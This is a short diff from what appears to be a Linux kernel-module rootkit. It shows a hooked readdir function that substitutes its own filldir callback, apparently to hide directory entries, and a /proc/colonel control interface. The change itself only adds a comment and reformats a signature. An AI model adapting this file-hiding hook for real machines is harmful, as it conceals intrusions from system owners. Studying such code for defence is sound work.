@@ -131,8 +131,9 @@ static int new_fs_readdir(struct file *filp, void *dirent, filldir_t filldir) {
 	return og_fs_readdir(filp, dirent, new_fs_filldir);
 }
 
-static int read_colonel(char *buffer, char **buffer_location, off_t off, 
-						int count, int *eof, void *data) {				/* reads /proc/colonel */
+/* read_colonel and write_colonel follow typical read/write kernel conventions, defined from the user p.o.v  --
+ * read_colonel writes to /proc/colonel and write_colonel reads from /proc/colonel */
+static int read_colonel(char *buffer, char **buffer_location, off_t off, int count, int *eof, void *data) {
 	int size;
 
 	sprintf(module_status, 
